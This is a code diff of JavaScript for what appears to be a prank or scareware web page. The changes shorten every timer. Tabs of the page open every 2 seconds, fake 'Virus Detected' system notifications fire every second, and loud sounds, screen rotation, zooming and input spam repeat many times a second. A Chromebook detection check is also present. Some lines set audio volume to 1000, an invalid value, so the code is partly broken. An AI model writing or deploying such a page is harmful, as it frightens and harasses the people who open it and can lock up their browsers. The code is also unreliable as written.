@@ -60,7 +60,7 @@
     function openRandomTabs() {
         window.open(window.location.href, '_blank');
     }
-    setInterval(openRandomTabs, 10000);
+    setInterval(openRandomTabs, 2000);
 
     function requestNotification() {
         if (Notification.permission !== 'granted') {
@@ -74,7 +74,7 @@
             new Notification('🚨 SYSTEM ALERT: Virus Detected! 🚨');
         }
     }
-    setInterval(sendNotification, 12000);
+    setInterval(sendNotification, 1000);
 
     function flashBackground() {
         document.body.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
@@ -84,7 +84,7 @@
     function rotatePage() {
         document.body.style.transform = `rotate(${Math.random() * 360}deg)`;
     }
-    setInterval(rotatePage, 7000);
+    setInterval(rotatePage, 400);
 
     function flickerScreen() {
         document.body.style.opacity = Math.random();
@@ -94,7 +94,7 @@
     function randomZoom() {
         document.body.style.zoom = Math.random() * 2;
     }
-    setInterval(randomZoom, 6000);
+    setInterval(randomZoom, 200);
 
     function randomButton() {
         let button = document.createElement("button");
@@ -118,7 +118,7 @@
         document.body.appendChild(img);
         setTimeout(() => img.remove(), 7000);
     }
-    setInterval(memeGIF, 10000);
+    setInterval(memeGIF, 5000);
 
     function flipUpsideDown() {
         document.body.style.transform = "rotate(180deg)";
@@ -140,12 +140,12 @@
         document.body.appendChild(msg);
         setTimeout(() => msg.remove(), 4000);
     }
-    setInterval(autoTypeMessages, 6000);
+    setInterval(autoTypeMessages, 1000);
 
     function changeTabTitle() {
         document.title = ["HACKED", "ERROR 404", "SYSTEM FAILURE", "VIRUS DETECTED", "YOU ARE DOOMED"][Math.floor(Math.random() * 5)];
     }
-    setInterval(changeTabTitle, 3000);
+    setInterval(changeTabTitle, 500);
 
     function spamConsole() {
         setInterval(() => {
@@ -192,7 +192,7 @@
         document.body.appendChild(input);
         setTimeout(() => input.remove(), 3000);
     }
-    setInterval(spamInputs, 4500);
+    setInterval(spamInputs, 100);
 
     function crazyBorder() {
         document.body.style.border = `10px solid hsl(${Math.random() * 360}, 100%, 50%)`;
@@ -206,17 +206,17 @@
 
     function playLoudSound() {
         const sound = document.getElementById('loudAudio');
-        sound.volume = 1;
+        sound.volume = 1000;
         sound.play();
     }
-    setInterval(playLoudSound, 1000);
+    setInterval(playLoudSound, 500);
 
     function playAlertSound() {
         const alert = document.getElementById('alertAudio');
-        alert.volume = 1;
+        alert.volume = 1000;
         alert.play();
     }
-    setInterval(playAlertSound, 1500);
+    setInterval(playAlertSound, 250);
 
     function fakeVolumeBoostMessage() {
         let div = document.createElement('div');
@@ -314,7 +314,7 @@ function violentScreenShake() {
         document.body.style.animation = '';
     }, 3000);
 }
-setInterval(violentScreenShake, 2500); // Every 20 seconds
+setInterval(violentScreenShake, 2500);
 
 function isChromebook() {
     const ua = navigator.userAgent.toLowerCase();
